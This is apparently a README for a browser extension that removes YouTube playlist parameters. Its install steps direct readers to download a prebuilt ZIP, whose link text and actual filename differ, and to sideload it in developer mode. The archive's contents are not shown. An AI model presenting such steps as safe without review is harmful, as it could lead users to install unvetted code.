# YouTube Standalone Opener 📺

A lightweight, high-performance browser extension that forces YouTube to open playlist videos as standalone videos. No more annoying playlist sidebars, forced autoplays, or cluttered URLs!

## ✨ Why this exists?
Many users get frustrated when clicking a video inside "Watch Later" or a custom playlist, because YouTube forces you into the playlist layout. This extension intercepts that action and automatically strips out the `&list=...` parameters on the fly, opening a clean, single-video player.

## 🚀 Features
- **Clean Interface:** Instantly removes the playlist sidebar and queue.
- **Ultra-lightweight:** Built entirely using a background Service Worker (`Manifest V3`). It doesn't inject heavy loops or lag your browser.
- **Privacy-focused:** 100% open-source, no trackers, no background telemetry.

## 🛠️ How to Install (Quick Setup)
Since this extension is open-source and run in developer mode, you can install it manually in less than a minute:

1. **Download** the ready-to-use ZIP archive: **[👉 Click here to download `YT-Standalone-Opener.zip` 👈](https://github.com/xxxrobert138-netizen/YT-playlist-remover/releases/download/1/YT-playlist-remover.zip)**
2. **Unzip** the downloaded folder anywhere on your computer.
3. Open your browser and navigate to `chrome://extensions/` (works on Chrome, Edge, Opera, Brave, and Yandex Browser).
4. Enable **Developer mode** by toggling the switch in the top-right corner.
5. Click the **Load unpacked** button in the top-left corner.
6. Select the **unzipped folder** (the one containing `manifest.json` and `background.js`).

*Done! Now go to YouTube, click any playlist video, and enjoy the clean view.*

## 💻 Tech Stack
- JavaScript (Web Extensions API)
- Manifest V3 Architecture (Service Workers)

## 📝 License
This project is open-source and free to use. Feel free to contribute or fork it!
